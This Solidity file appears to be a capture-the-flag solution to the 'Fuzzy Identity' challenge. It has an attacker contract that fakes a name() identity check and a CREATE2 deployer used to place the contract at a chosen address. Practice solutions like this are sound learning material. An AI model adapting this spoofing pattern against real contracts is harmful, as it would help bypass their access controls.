//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.4;

interface IName {
    function name() external view returns (bytes32);
}

interface IFuzzyIdentityChallenge {
    function authenticate() external;
}

contract FuzzyIdentityAttacker is IName {
    function authenticate(address _target) external {
        IFuzzyIdentityChallenge(_target).authenticate();
    }

    function name() external pure override returns (bytes32) {
        return bytes32("smarx");
    }
}

contract FuzzyDeployer {
    event Deployed(address addr);

    function deploy(bytes memory bytecode, bytes32 salt)
        external
        returns (address addr)
    {
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }
        emit Deployed(addr);
    }
}
